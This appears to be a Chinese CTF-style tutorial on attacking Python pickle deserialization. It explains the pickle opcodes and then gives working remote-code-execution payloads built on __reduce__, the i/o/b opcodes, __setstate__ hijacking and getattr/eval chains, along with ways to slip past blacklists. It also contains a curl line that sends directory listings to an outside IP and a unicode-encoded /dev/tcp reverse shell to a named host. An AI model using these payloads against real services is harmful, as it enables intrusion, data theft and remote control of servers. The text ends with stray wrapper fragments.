b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n更多参考\nb'Vabcd\\np0\\n.'\nV：unicode编码 p：将堆栈最上面的项目复制到memo中 使用pickletools将opcode转换为易于读取的形式\nimport pickletools data=b\"\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b'1'\\nkey2=b'2'q\\x01\\x85q\\x02Rq\\x03.\" pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL 'builtins exec' 17: q BINPUT 0 19: X BINUNICODE \"key1=b'1'\\nkey2=b'2'\" 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 利用方法 linkR指令 link原理 link大多数题目利用__reduce__方法，其指令码为R，作用为：\n取栈顶元素为args，弹出 取栈顶为f，弹出 arg为参数，执行f，结果压入栈 此方法会在反序列化的时候执行，f会返回字符串或元组。\n选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数\nb'''cos system (S'whoami' tR.''' 利用此方法构造恶意字符串：\nclass Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def __reduce__(self): return os.system, (\"ls /\",) a = pickle.dumps(Student(), protocol=3) 绕过方式 link 如果黑名单没禁全，尝试`platform.popen(cmd, mode=‘r’, bufsize=-1) 使用map class Exploit(object): def __reduce__(self): return map,(os.system,[\"ls\"]) i指令码 link b'''(S'whoami' ios system .''' 先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。\n0: ( MARK 1: S STRING 'whoami' 11: i INST 'os system' (MARK at 0) 22: . STOP o指令码 link b'''(cos system S'whoami' o.''' 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）。\n0: ( MARK 1: c GLOBAL 'os system' 12: S STRING 'whoami' 22: o OBJ (MARK at 0) 23: . STOP c指令码 link原理 link class Student(): def __init__(self): self.name = \"rxz\" self.grade = \"G2\" def check(data): if b'R' in data: return 0 x = pickle.loads(data) if x != Student(blue.name,blue.grade): return 0 return 1 c指令码的作用是获取全局变量，故而可以通过替换rxz为blue.name即可 换成指令是cblue\\nname\\n。 原本是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00rxzq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.' 最后结果是b'\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00namecblue\\nname\\nq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00G2q\\x06ub.'\n绕过 link如果题目对c指令进行了限制，只允许包含__main__这一个模块，则可以使用变量覆盖。 通过此指令引入的变量，可以看作是原变量的引用，从栈上修改他，也会修改原变量。\n先通过__main__.blue引入这个module 然后把一个dict压入栈，内容为{'name': 'rua', 'grade': 'www'} 执行b指令，会改写__main__.blue.name和 __main__.blue.grade，因此两个变量的值都变为了预期值，后面再正常压入Student对象即可 结果： b'\\x80\\x03c__main__\\nblue\\n}(Vname\\nVrua\\nVgrade\\nVwww\\nub0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.' b指令RCE link原理 link执行build时，当inst拥有__setstate__方法时，把state交给他处理，否则合并到元组内。 所以可以先用build写入{'__setstate__': os.system}，把对象的__setstate__变为os.system，接下来利用\"ls /\"再build对象，会执行__setstate__(\"ls /\")，从而达成RCE。 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.' 执行完代码后清空栈，再压入一个正常的类即可防止报错 payload：b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb0c__main__\\nStudent\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.'\n绕过 link针对重写find_class的，可以利用sys.module获取危险函数。 sys.module是一个全局字典，字典的键是模块名，值是模块本身。 所以可以通过get(sys.modules,\"moduleName\")获取危险模块。\nprint(sys.modules) # 输出全部模块 最终需要构造的payload是：builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) 写成opcode：\nb'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' 其他 link 其他模块的load也可能触发pickle反序列化，如numpy.load()，使用numpy自身的数据失败后，可以尝试用pickle的格式导入。 即使代码里面没有import os，GLOBAL指令也会自动导入。 无回显时执行os.system('curl your_server/`ls / | base64`)即可在日志中查看结果。 payload: b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVcurl 47.***.***.105/`ls / | base64`\\nb.' 绕过各种限制的方式和jail一样 如双写\npk = pickle.dumps(yourobject) pk = pk.replace(b'os', b'ooss') 字符串拼接\nclass A(object): def __reduce__(self): return eval,(\"__import__('o'+'s').system('env |tee b')\",) 其他：\na = base64.b64decode(session.get('ser_data')).replace(b\"builtin\", b\"BuIltIn\").replace(b\"os\", b\"Os\").replace(b\"bytes\", b\"Bytes\") if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(\"R i o b is forbidden\") pickle.loads(base64.b64decode(session.get('ser_data'))) 检测的是a有无riob，但是运行时还是ser_data，利用o和s连用组成os，替换为Os绕过 反弹shell用到i，会被检测，所以用V，能识别unicode编码\nb'''(cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 因为s的作用是从堆栈中弹出三个值，一个字典，一个键和值。键/值条目是添加到字典，它被推回到堆栈上，所以前面需要添加一个字典和一个键：\nb'''(S'ba' S'ss' dS'sdasda' (cos system V'\\u0073\\u0068\\u0020\\u002d\\u0069\\u0020\\u003e\\u0026\\u0020\\u002f\\u0064\\u0065\\u0076\\u002f\\u0074\\u0063\\u0070\\u002f\\u0031\\u0033\\u0039\\u002e\\u0032\\u0032\\u0034\\u002e\\u0031\\u0033\\u0030\\u002e\\u0031\\u0038\\u0033\\u002f\\u0031\\u0030\\u0030\\u0030\\u0032\\u0020\\u0030\\u003e\\u0026\\u0031' os.''' 手写opcode link三种print的方法：\n# __import__(\"builtins\").print('a', 'b') R = b'''cbuiltins print (S'a' S'b' tR. ''' o = b'''(cbuiltins print S'a' S'b' o. ''' i = b'''(S'a' S'b' ibuiltins print . ''' 例：执行系统命令： builtins.getattr(builtins, 'eval')(\"__import__('os').system('pwd')\") 用到c指令导入的有builtins.getattr和builtins，但pickle不能直接获取builtins一级模块，所以builtins不能直接导入，需要用： builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins')获取。 组合得到： builtins.getattr(builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins'), 'eval')(\"__import__('os').system('pwd')\") 分层编写opcode： 最内层function(\"__import__('os').system('pwd')\")\nb'''( S'__import__('os').system('pwd')' o. ''' 然后是最外层的builtins.getattr\nb'''( /////// (cbuiltins getattr arg1 S'eval' o /////// S'__import__('os').system('pwd')' o. ''' 补全arg1，从内层开始`(builtins.globals(), ‘builtins’)\nb'''((cbuiltins getattr /////// (cbuiltins globals o S'builtins' /////// S'eval' o S'__import__('os').system('pwd')' o. ''' pickletools.dis(test) 最后是builtins.getattr(builtins.dict, 'get')\nb'''((cbuiltins getattr ( /////// (cbuiltins getattr cbuiltins dict S'get' o /////// (cbuiltins globals o S'builtins' o S'eval' o S'__import__('os').system('pwd')' o. ''' 最终payload：\nb'''((cbuiltins getattr ((cbuiltins getattr cbuiltins dict S'get' o(cbuiltins globals oS'builtins' oS'eval' oS'__import__('os').system('whoami')' o. ''' "
             }
         );
